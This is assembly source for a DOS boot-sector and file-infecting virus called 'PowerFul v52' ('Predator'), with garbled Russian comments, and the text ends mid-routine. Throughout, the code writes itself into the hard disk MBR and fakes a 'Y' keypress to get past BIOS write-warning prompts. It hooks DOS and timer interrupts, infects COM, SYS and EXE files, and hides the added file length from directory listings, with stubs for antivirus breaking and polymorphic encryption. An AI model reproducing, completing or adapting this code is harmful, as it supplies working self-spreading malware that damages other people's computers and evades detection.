ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[POWERFUL.ASM]ÄÄÄ
; ‚¨pãá Predator 
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Const ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;‚¥pá¨ï ¢¨pãá                                                 ;³
version_of_virus equ <52>                                     ;³
;„«¨­­  ¢¨pãá  ¢ ¡ ©â å                                       ;³
length_virus_in_bate=(endvirus-virus)                         ;³
;„«¨­­  ¢¨pãá  ¢ á¥ªâ®p å                                     ;³
length_virus_in_sector=(length_virus_in_bate)/200h+1          ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
public  virus ;For Soft-Ice
include macro.inc
.286
.model tiny
locals
jumps
.code
start:
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ ANTIVIRUS BREAK ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;H  p¥ «ì­®¬ § p ¦¥­­®¬ ä ©«¥ á¤¥áì ¡ã¤ãâ p á¯®«®£ âìáï ANTIVIRUS'­ë¥
;¡pïª¨ (â®çª¨ ¨å ®áâ ­®¢ )
;       push_all_register ;â® ¡ã¤¥â ­  p¥ «ì­®¬ § p ¦¥­­®¬ ä ©«¥
;       mov      ah,2
;       mov      dl,40h
;       int      21h
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ SMEG Decryptor ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;H  p¥ «ì­®¬ § p ¦¥­­®¬ ä ©«¥ á¤¥áì ¡ã¤¥â ­ å®¤¨âáï ¤¥ªp¨¯â®p â¨¯  SMEG.
;…£® ¤«¨­­  á«ãç ©­  ®â 400h ¤® 600h
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ Virus ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
virus:  ; ‚ ¯ ¬ïâ¨ ¬¥âª  VIRUS ¤®«¦­  ­ å®¤¨âáï ¯®  ¤p¥áã cs:0
        jmp      goto_virus
; Manager of Predator 
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Const ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;€¤p¥á ­ å®¦¤¥­¨ï MANAGER'  ¢ ¯ ¬ïâ¨                           ³
address_of_manager_in_memory=240h                             ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
begin_manager:
        dw       31f5h
%       db       'PowerFul v&version_of_virus& // DK'
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;á­®¢­ ï ¯®áâ®ï­­ ï ç áâì manager' .
;¡p ¡®âª  21'£® ¯p¥pë¢ ­¨ï ¢ manager
obr_int_21_in_manager:
        push_all_register_withf
        cld
        zero_ds
        set_es_BC00
        cmp      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        jz       two_part_of_manager
        cmp      ax,3521h ;± ‚§ïâì 21'ë© ¢¥ªâ®p
        jnz      maybe_set_vector
        pop_all_register_withf
        les      bx,cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        iret
maybe_set_vector:
        cmp      ax,2521h ;± ®áâ ¢¨âì 21'ë© ¢¥ªâ®p
        jnz      two_part_of_manager
        pop_all_register_withf
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],dx
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        mov      byte ptr cs:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        mov      word ptr cs:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr cs:[21h*4+2],0
        iret
two_part_of_manager:
        mov      ah,0fh ;„ âì â¥ªãé¨© VIDEO à¥¦¨¬
        pushf
        call     dword ptr ds:[10h*4]
        cmp      al,3h
        ja       quit_manager
        jmp      quit_manager
        ;à®¢¥à¨¬ ­ «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨
        call     crc
        jnc      detected_virus_in_memory
        dec      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory]
        cmp      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],0
        ja       quit_manager
        mov      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],200d
        ;—¨â ¥¬ ¢¨àãá
        xor      bx,bx
virus_place_on_disk:
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        pushf
        call     dword ptr ds:[13h*4] ;—¨â ¥¬ ¢¨pãá ¢ ‚¨¤¥® ãä¥p BC00:0000
        jc       quit_manager
detected_virus_in_memory:
        ;¥à¥¤ ç  ã¯à ¢«¥­¨ï ¢¨àãáã
        lds      ax,ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      es:[place_of_int21-virus+1],ax
        mov      es:[place_of_int21-virus+3],ds
        pop_all_register_withf
        jmp      dword ptr cs:[jumper-begin_manager+address_of_manager_in_memory]
quit_manager:
        pop_all_register_withf
int21_old_vector_in_manager:
        db       0eah,00,00,00,00
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
crc:    push_all_register
        set_ds_BC00
        xor      bx,bx
        xor      ax,ax
        mov      si,offset(begin_solve_crc16-virus)
        mov      cx,offset(end_solve_crc16-begin_solve_crc16)
        cld
crc16:  lodsb    ;AL <- DS:[SI]
        shr      bx,1
        add      bx,ax
        loop     crc16
        cmp      bx,13Eh
        jnz      bad_crc
        clc
        jmp      quit_crc
bad_crc:
        stc
quit_crc:
        pop_all_register
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‚p¥¬¥­­ ï ç áâì manager'a, ¨á¯®«ì§ã¥âáï â®«ìª® ¯p¨ § £pã§ª¥ ¤«ï
;¯¥p¥å¢ â  INT 21.
;¡p ¡®âª  8'£® ¯p¥pë¢ ­¨ï ¢ manager
obr_int_8_in_manager:
        push_all_register_withf
        xor      ax,ax
        mov      ds,ax
        mov      ax,word ptr ds:[21h*4+2]
        cmp      ax,800h
        ja       @@quit
        ;“áâ ­ ¢«¨¢ ¥¬ á¢®¥ INT 21
        cli
        les      bx,ds:[21h*4]
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      word ptr ds:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr ds:[21h*4+2],0
        mov      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],0
        les      bx,cs:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      ds:[8h*4],bx
        mov      ds:[8h*4+2],es
@@quit:
        pop_all_register_withf
int8_old_vector_in_manager:
        db       0eah,00,00,00,00
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ DATA in manager ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
jumper                    dw offset(obr21-virus),0Bc00h
solving                   db 200d
flag_obr_int21            db 0h
;ãää¥p  ¤«ï ¨¬¥­, ­ å®¤ïâáï ¢ MANAGER
for_5b_3c_file_name       db 50h  dup (?)
for_5b_3c_handle          dw 0ffh
manager_idle_flag         db 0h ;‘¤¥áì 1'æ  ¥á«¨ MANAGER ¢ëª«îç¥­
end_manager:
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ BOOT ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
begin_mbr:
        xor      bx,bx
        cli
        mov      sp,7c00h
        mov      ss,bx
        sti
        jmp      short jump_version
check_mbr:
        ;Œ¥âª  ¤«ï p á¯®§­ ¢ ­¨ï ¥áâì «¨ ¬ë ã¦¥ ­  MBR
        dw       31f5h
        db       version_of_virus
jump_version:
        mov      ax,0bc00h
        mov      es,ax
virus_place_on_disk2:
        ;—¨â ¥¬ ¢¨pãá ¢ ‚¨¤¥® ãä¥p BC00:0000
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        int      13h
        push     es
        mov      ax,offset(after_mbr-virus)
        push     ax
        retf
end_mbr:
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ AFTER BOOT ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Data section ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
flag_what_file db 4h                                             ;³
; 1, ¥á«¨ íâ®â ä ©« COM                                          ;³
; 2, ¥á«¨ íâ®â ä ©« SYS                                          ;³
; 3, ¥á«¨ íâ®â ä ©« EXE (DOS)                                    ;³
; 4, ¥á«¨ íâ®â ä ©« PE EXE (32'bit Windows 95 app)               ;³
; 4, â ª¦¥ ­¥®¡å®¤¨¬® ¤«ï Original Instalation                   ;³
string_NT  db 10,'Windows*NT'                                    ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;H  ¢å®¤¥ ¢ AFTER MBR: ES=BC00h=CS
after_mbr:
        ;®¤£®â ¢«¨¢ ¥¬ manager
        zero_es
        push     cs
        pop      ds
        mov      si,offset(begin_manager-virus)
        mov      di,address_of_manager_in_memory
        mov      cx,offset(end_manager-begin_manager)
;è¨¡ª  ¥á«¨ à §¬¥à Manager'  ¡®«ìè¥ 200h
.errnz  offset(end_manager-begin_manager) GT (400h-address_of_manager_in_memory)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        ;“áâ ­ ¢«¨¢ ¥¬ INT8 ­  manager
        lds      bx,es:[8h*4]
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        cli
        mov      es:[8h*4],offset(obr_int_8_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr es:[8h*4+2],0
        sti
        ;—¨â ¥¬ ®à¨£¨­ «ì­ë© MBR ¨ ¯¥à¥¤ ¥¬ ¥¬ã ã¯à ¢«¥­¨¥
        mov      ax,0201h
        mov      bx,7c00h
        mov      cx,word ptr cs:[virus_place_on_disk2-virus+1]
        dec      cx
        mov      dx,0080h
        int      13h ;—¨â ¥¬ ®p¨£¨­ «ì­ë© MBR ¯®  ¤p¥áã 0:7c00h
        push     es
        push     bx
        retf
; General Virus Entry Point 
;H  ¢å®¤¥ ¢ áâ¥ª¥ (DS ES PUSHA - ¥á«¨ á¤¥« âì POP AX, â® AX ¡ã¤¥â = DS)
goto_virus:
        push     cs
        pop      ds
        call     $+3
init_offset_of_virus:
        pop      si
        sub      si,offset(init_offset_of_virus-virus)
        push     si
        ;p®¢¥p¨¬ ¬®¦¥â ¬ë ¯®¤ NT á¨¤¨¬
        mov      ah,62h
        int      21h
        mov      es,bx
        mov      es,es:[2ch]
        xor      di,di     ;ES:DI = 0:0 - â ªã¤  ­ ç âì áª ­¨p®¢ ­¨¥ ¯ ¬ïâ¨
        mov      cx,200h   ;‘ª®«ìª® áª ­¨p®¢ âì
        mov      bx,1h     ;˜ £ áª ­¨p®¢ ­¨ï p ¢¥­ 1'æ¥
        lea      si,[string_NT-virus+si]
        call     scan_mem_call
        pop      si
        push     si
        jc       goto_normal_programm       ; ¡­ pã¦¨«¨ Windows NT
        lea      bx,[endvirus-virus+si]     ; —¨â âì §  â¥«® ¢¨àãá 
        push     cs
        pop      es
        mov      cx,0001h                   ; ‘¥ª=1 –¨«=0
        mov      dx,0080h                   ; ƒ®«=0 ‚¨­â
        mov      ax,0201h
        int      13h
        jnc      check_our_on_mbr           ; “å®¤¨¬ ¯p¨ ®è¨¡ª¥ çâ¥­¨ï MBR
        cmp      byte ptr ds:[extention-virus+si],2 ;SYS ä ©«
        jz       goto_normal_programm
        jmp      write_on_memory
check_our_on_mbr:
        cmp      word ptr ds:[check_mbr-begin_mbr+bx],31f5h
                 ; p®¢¥pï¥¬ ¥áâì-«¨ ¬ë ã¦¥ ­  MBR
        jz       write_on_memory
        call     take_param_disk
        jc       write_on_memory
        ;‡ ¯¨áë¢ ¥¬ ®à¨£¨­ «ì­ë© MBR ­  á¥ªâ®à
        mov      ax,0301h
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ; ¨è¥¬ â¥«® ¢¨pãá  ­  ¤¨áª.
        mov      ah,03h
        ;‘ª®«ìª® á¥ªâ®p®¢ § ­¨¬ ¥â ¢¨pãá
        mov      al,length_virus_in_sector
        mov      bx,si
        inc      cx               ;“¦¥ § ¯¨á ­ ®à¨£. MBR
        mov      word ptr ds:[virus_place_on_disk-virus+1+bx],cx
        mov      word ptr ds:[virus_place_on_disk2-virus+1+bx],cx
                                   ;‡ ¯®¬­¨¬ á¥ªâ®à ¨ æ¨«¨­¤¥p, £¤¥ ­ å®¤¨âáï
                                   ;­ ç «® ¢¨pãá 
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ;¥p¥­®á¨¬ ­ èã MBR'­ãî ç áâì ¢ ¨å­¨© MBR
        lea      si,[begin_mbr-virus+bx]   ;€¤à¥á MBR-­®© ç áâ¨ ¢¨àãá .
        lea      di,[endvirus-virus+bx]    ;€¤à¥á £¤¥ ®à¨£. MBR á¥©ç á ­ å®¤¨âáï.
        mov      cx,offset(end_mbr-begin_mbr)
        rep      movsb                     ;‡ ­®á¨¬ ¢ ®à¨£. MBR ­ è.
        ;H ¦¨¬ ¥¬ "Y", ¥á«¨ ¢¤pã£ ¯®ï¢¨âáï â ¡«¨çª  BIOS'  ® § ¯¨á¨ ­  MBR
        zero_ds
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh+2h
        mov      word ptr ds:[041eh],1559h
        ;¨è¥¬áï ­  MBR
        mov      ax,0301h
        lea      bx,[endvirus-virus+bx]
        call     set_dses_cs
        mov      cx,0001h
        mov      dx,0080h
        call     call_int_13
        zero_ds
        ;ç¨é ¥¬ ¡ãää¥p ª« ¢¨ âãpë
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh
        jmp      write_on_memory
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
take_param_disk:
        mov      ah,8h
        mov      dl,80h
        int      13h           ;®«ãç¨âì ¯ à ¬¥âàë ¤¨áª 
        jc       quit_from_take_param_disk
        and      cl,00111111B  ;CL-¬ ªá¨¬ «ì­ë© ­®¬¥à á¥ªâ®à , ¯¥p¢ë¥ ¤¢  ¡¨â  íâ® ®â –¨«¨­¤p 
                               ;‘H-¬ ªá¨¬ «ì­ë© ­®¬¥à æ¨«¨­¤à 
                               ;DH-Œ ªá¨¬ «ì­ë© ­®¬¥à £®«®¢ª¨, ¯¥p¢ë¥ ¤¢  ¡¨â  íâ® ®â –¨«¨­¤p 
        cmp      cl,1+1+length_virus_in_sector+1
        ;1(Reserved_for_MBR)+1(OLD_MBR)+(„«¨­­  ¢¨pãá  ¢ á¥ªâ®p å)+1(Reserved)
        jb       quit_from_take_param_disk_with_set_carry
        mov      cl,2
        xor      ch,ch
        xor      dh,dh
quit_from_take_param_disk:
        retn
quit_from_take_param_disk_with_set_carry:
        stc
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
call_int_13:
        push     ds
        zero_ds
        pushf
        cli
        call     dword ptr ds:[13h*4]
        pop      ds
        retn
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ pë¦®ª ¢ ¯ ¬ïâì ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
write_on_memory:
        zero_ds
        cmp      word ptr ds:[address_of_manager_in_memory],31f5h
        jnz      goto_normal_programm
        cmp      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1h
        jnz      goto_normal_programm
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],0
        mov      ax,3521h ;ES:BX
        int      21h
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      ax,2521h ;DS:DX
        mov      dx,offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        int      21h
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍ ¥p¥¤ ç  ã¯p ¢«¥­¨ï ­®p¬ «ì­®© ¯p®£p ¬¬¥ ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
goto_normal_programm:
        pop      bx        ;‘¬¥é¥­¨¥ ¬¥âª¨ Virus
        call     set_dses_cs
        cmp      byte ptr ds:[bx+extention-virus],4 ;smartdrv.exe
        jnz      itis_not_smartdrv
        mov      ax,4c00h
        int      21h
itis_not_smartdrv:
        mov      ax,cs
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS ä ©«
        jz       decrypt_sysfile
        pop      ax        ;’®â ES, ª®â®pë© ¢ áâ¥ª¥
        push     ax        ;„«ï COM ¨ EXE ä ©«®¢ ®â­®á¨â¥«ì­ ï â®çª 
                           ;p áè¨äp®¢ª¨ PSP+10h:0000
        add      ax,10h
decrypt_sysfile:
        mov      es,ax
        call     decrypt_blok
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS ä ©«
        jnz      itisnot_SYS_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ SYS ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        mov      ax,word ptr ds:[bx+old_first_1c_byte-virus+6]
        mov      ds:[6],ax
        add      word ptr ds:[bx+sys_jmp-virus+3],bx
        pop_all_register
sys_jmp:
        jmp      cs:[old_first_1c_byte-virus+6]
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
itisnot_SYS_file:
        pop      es
        push     es
        mov      bp,es
        add      bp,10h
        add      ds:[old_first_1c_byte-virus+bx+16h],bp     ;Relo CS
        add      ds:[old_first_1c_byte-virus+bx+0eh],bp     ;Relo SS
        add      word ptr ds:[here_jmp-virus+3+bx],bx
        cmp      byte ptr ds:[extention-virus+bx],3    ;EXE ä ©«
        jz       itis_EXE_file
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ COM ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
        lea      si,[old_first_1c_byte-virus+bx]
        mov      di,100h
        mov      cx,03h
        rep      movsb   ;DS:[SI] -> ES:[DI]
        pop_all_register
        jmp      here_jmp
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;H  ¢å®¤¥ BP = PSP+10h
itis_EXE_file:
        mov      ds,es:[2ch] ;‘¥£¬¥­â­ë©  ¤p¥áá á¨áâ¥¬­®£® ª®­â¥ªáâ 
        xor      si,si
        ;ˆé¥¬ ¯ãâì ¤® EXE ä ©« 
seach_to_EXE_file:
        inc      si
        cmp      word ptr [si],0
        jnz      seach_to_EXE_file
        add      si,4
        mov      dx,si
        ;âªpë¢ ¥¬ ä ©«
        mov      ax,3d00h
        int      21h
        jc       error_adjust_EXE_file
        push     cs
        pop      ds
        mov      word ptr ds:[bx+handle_of_EXE_file-virus+1],ax
        xor      cx,cx
        ;‘¬¥è¥­¨¥ â ¡«¨æë ¯¥p¥¬¥é¥­¨ï
        mov      dx,ds:[bx+old_first_1c_byte-virus+18h]
        mov      ax,4200h
        call     call_int_21_adjust_EXE_file
next_blok_item:
        lea      si,ds:[bx+offset_for_adjust_EXE_file-virus]
        mov      dx,si
        ;Š®«¨ç¥áâ¢® í«¥¬¥­â®¢ ¢ â ¡«¨æ¥ ¯¥p¥¬¥é¥­¨ï
        mov      cx,ds:[bx+old_first_1c_byte-virus+06h]
        jcxz     EXE_file_is_adjusted
        cmp      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
        jc       blok_item_is_not_big
        mov      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
blok_item_is_not_big:
        sub      ds:[bx+old_first_1c_byte-virus+06h],cx
        push     cx
        shl      cx,1
        shl      cx,1   ;CX*4
        mov      ah,3fh
        call     call_int_21_adjust_EXE_file
        jc       error_adjust_EXE_file
        pop      cx
next_item:
        add      [si+2],bp
        les      di,[si]
        add      es:[di],bp
        add      si,4
        loop     next_item
        cmp      word ptr [bx+old_first_1c_byte-virus+06h],0
        ja       next_blok_item
EXE_file_is_adjusted:
        mov      ah,3eh   ;‡ ªpëâì ®¯¨á â¥«ì ä ©« 
        call     call_int_21_adjust_EXE_file
        add      word ptr ds:[bx+here_sp-virus+3],bx
        add      word ptr ds:[bx+here_reloss-virus+3],bx
        pop_all_register
        cli
here_sp:
        mov      sp,cs:[old_first_1c_byte-virus+10h] ;SP
here_reloss:
        mov      ss,cs:[old_first_1c_byte-virus+0eh] ;Relo SS
        sti
here_jmp:
        jmp      dword ptr cs:[old_first_1c_byte-virus+14h]
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
error_adjust_EXE_file:
        sti
        mov      ax,4c00h
        int      21h
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Data Section ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
old_first_1c_byte  db 0,1,2     ;‘¤¥áì ¡ã¤¥â JMP ¤«ï COM ä ©«  ;³
                   db 3,4,5,6,7,8,9,0ah,0bh,0ch,0dh            ;³
                   db 0f0h,0ffh ;‘¬¥é¥­¨¥ 0eh - Relo SS        ;³
                   db 0feh,0ffh ;‘¬¥é¥­¨¥ 10h - SP             ;³
                   db 012h,013h                                ;³
                   db 000h,001h ;‘¬¥é¥­¨¥ 14h - IP             ;³
                   db 0f0h,0ffh ;‘¬¥é¥­¨¥ 16h - ReloCS         ;³
                   db 018h,019h,01ah,01bh                      ;³
;„ ­­ë¥ OLD_FIRST_1C_BYTE ¤®«¦­ë ­ å®¤¨âáï ­  íâ®¬ ¬¥áâ¥,      ;³
;¨­ ç¥ ª®£¤  ¡ã¤¥â ¯¥p¥¤ ¢ âìáï ã¯p ¢«¥­¨¥ EXE ä ©«ã,          ;³
;í«¥¬¥­âë ¯¥p¥ªp®îâ ¨å                                         ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
call_int_21_adjust_EXE_file:
        push     bx
handle_of_EXE_file:
        mov      bx,0100h
        int      21h
        pop      bx
        retn
offset_for_adjust_EXE_file:
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ ¡p ¡®âª  21-®£® ¯p¥pë¢ ­¨ï ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
begin_solve_crc16:
obr21:  pushf
        cld
        cmp      ah,11h ;±
        jz       stealth_line_fcb
        cmp      ah,12h ;±
        jnz      steal2
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;‘ªpë¢ ¥¬ ¤«¨­­ã, ¥á«¨ ä ©« ¯ëâ îâáï ­ ©â¨ ç¥p¥§ FCB    ³
stealth_line_fcb:                                      ;³
        push     bx es ax                              ;³
        mov      ah,2fh                                ;³
        call     call_int_21                           ;³
        pop      ax                                    ;³
        call     call_int_21                           ;³
        cmp      al,0ffh                               ;³
        jz       Fer1                                  ;³
        push     ax                                    ;³
        cmp      byte ptr es:[bx],0ffh                 ;³
        jnz      Fer2                                  ;³
        add      bx,7h                                 ;³
Fer2:   add      bx,17h                                ;³
        call     check_on_allredy_virused              ;³
        pop      ax                                    ;³
        jnc      Fer1                                  ;³
        add      bx,6h                                 ;³
        call     give_length_without_virus             ;³
Fer1:   pop      es bx                                 ;³
Lbusy2: popf                                           ;³
        iret                                           ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
end_solve_crc16:
steal2: cmp      ah,4eh ;±
        jz       stealth_line_of_file
        cmp      ah,4fh ;±
        jnz      other_funtions
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;‘ªpë¢ ¥¬ ¤«¨­­ã, íâ® ¤«ï äã­ªæ¨© 4E ¨ 4F.              ³
stealth_line_of_file:                                  ;³
        push     bx es ax                              ;³
        mov      ah,2fh  ; „ âì  ¤p¥á â¥ªãé¥© DTA      ;³
                         ; ‚å®¤: ES:BX -  ¤p¥á ­ ç «   ;³
        call     call_int_21                           ;³
        pop      ax                                    ;³
        call     call_int_21                           ;³
        jc       quit_stc_retf2                        ;³
        push     ax                                    ;³
        add      bx,16h                                ;³
        call     check_on_allredy_virused              ;³
        pop      ax                                    ;³
        jnc      quit_clc_retf2                        ;³
        add      bx,4h ;„«¨­­                          ;³
